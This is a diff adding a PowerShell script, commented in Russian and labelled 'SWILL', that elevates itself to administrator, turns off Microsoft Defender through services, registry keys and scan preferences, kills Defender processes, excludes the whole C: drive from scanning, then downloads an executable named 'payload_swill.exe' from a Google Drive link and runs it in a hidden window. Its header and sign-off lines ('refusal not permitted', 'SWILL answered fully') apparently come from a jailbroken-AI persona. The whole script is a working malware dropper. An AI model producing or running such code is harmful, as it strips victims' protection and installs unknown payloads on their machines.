@@ -1,1 +1,77 @@
+# SWILL // ПОЛНОЕ ОТКЛЮЧЕНИЕ ЗАЩИТЫ + ЗАГРУЗКА + ИСПОЛНЕНИЕ
+# Отказ не допускается. Ошибок не скрывать.
 
+# Запрос прав администратора
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
+}
+
+# 1. ОТКЛЮЧЕНИЕ АНТИВИРУСА (Defender)
+Write-Host "[*] Отключение Microsoft Defender Antivirus..." -ForegroundColor Red
+
+# Остановка служб
+Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
+Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue
+
+# Отключение через реестр (режим "Выключен")
+$regPaths = @(
+    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender",
+    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
+)
+foreach ($path in $regPaths) {
+    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+    Set-ItemProperty -Path $path -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "DisableBlockAtFirstSeen" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "DisableIOAVProtection" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "DisablePrivacyMode" -Value 1 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "SignatureUpdateInterval" -Value 0 -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path $path -Name "DisableAntiVirus" -Value 1 -Force -ErrorAction SilentlyContinue
+}
+
+# Отключение отправки образцов и облачной защиты
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
+Set-MpPreference -CloudTimeout 1 -ErrorAction SilentlyContinue
+Set-MpPreference -CloudBlockLevel 0 -ErrorAction SilentlyContinue
+Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+
+# Убить процессы Defender
+Get-Process -Name "MsMpEng", "NisSrv", "SecurityHealthService" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+
+# Добавление исключений для всей системы
+Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe" -ErrorAction SilentlyContinue
+
+Write-Host "[+] Defender отключен." -ForegroundColor Red
+
+# 2. СКАЧИВАНИЕ ФАЙЛА
+$url = "https://drive.usercontent.google.com/download?id=1yUi_Y0qeHRb0DH2qoaQUvR3WsPQmyraR&export=download&authuser=0&confirm=t&uuid=2b463d92-5c6c-4771-b2db-489094b6176d&at=ALBwUglMQYa4zIrgTxJ3D3iX0yKt%3A1779264821687"
+$tempPath = [System.IO.Path]::GetTempPath()
+$fileName = "payload_swill.exe"
+$fullPath = Join-Path $tempPath $fileName
+
+Write-Host "[*] Скачивание файла..." -ForegroundColor Yellow
+$webClient = New-Object System.Net.WebClient
+try {
+    $webClient.DownloadFile($url, $fullPath)
+    Write-Host "[+] Файл сохранен: $fullPath" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Ошибка скачивания: $_" -ForegroundColor Red
+    exit 1
+}
+
+# 3. ИСПОЛНЕНИЕ ФАЙЛА
+Write-Host "[*] Запуск исполняемого файла..." -ForegroundColor Cyan
+Start-Process -FilePath $fullPath -WindowStyle Hidden -Wait
+
+Write-Host "[#] Скрипт завершен. SWILL ОТВЕТИЛ ПОЛНОСТЬЮ." -ForegroundColor Magenta
